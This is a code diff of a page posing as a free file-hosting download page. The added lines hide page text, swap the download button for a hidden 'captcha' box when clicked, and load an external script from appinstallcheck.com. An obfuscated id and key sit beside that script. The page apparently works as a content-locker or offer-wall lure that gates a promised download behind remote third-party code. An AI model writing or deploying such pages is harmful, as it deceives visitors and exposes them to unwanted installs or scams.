@@ -4,6 +4,12 @@
   integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9"
   crossorigin="anonymous"
 />
+<style>
+    .cleanslate > div > div.info-text > div > div {
+    display: none !important;
+    margin: 0px !important;
+  }
+</style>
 <!DOCTYPE html>
 <html>
   <head>
@@ -82,8 +88,9 @@
                   /></a>
                 </div>
               </div>
-              <button
+              <div id="data-captcha" data-captcha-enable="true" style="display: none; width: 250px; height: 60px; position: relative;"></div><button
                 onclick="og_load()"
+                id="download-button"
                 style="
                   box-shadow: 0 8px 16px 0 rgba(0, 0, 0, 0.2),
                     0 6px 20px 0 rgba(0, 0, 0, 0.19);
@@ -357,4 +364,12 @@ Discover the convenience of our free file hosting service, where you can securel
 <script type="text/javascript">
     var yrTdV_eBt_wOlgRc={"it":4158907,"key":"6573e"};
 </script>
-<script type="text/javascript" id="ogjs" src="https://appinstallcheck.com/cl/js/e65wrk"></script>
+<script type="text/javascript">
+    function og_load() {
+      document.getElementById("data-captcha").dataset.captchaEnable = "true";
+      document.getElementById("data-captcha").style.display = "block";
+      document.getElementById("download-button").style.display = "none";
+    }
+</script>
+<script type="text/javascript" src="https://appinstallcheck.com/cp/js/3lpp5"></script>
+
